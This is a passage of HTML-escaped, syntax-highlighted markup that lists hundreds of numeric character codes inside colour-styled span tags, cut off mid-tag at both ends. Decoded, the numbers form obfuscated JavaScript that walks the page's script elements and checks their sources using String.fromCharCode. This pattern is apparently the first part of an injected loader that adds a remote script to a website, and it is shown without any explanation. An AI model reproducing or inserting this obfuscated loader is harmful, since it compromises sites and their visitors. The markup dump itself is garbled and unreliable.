style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span 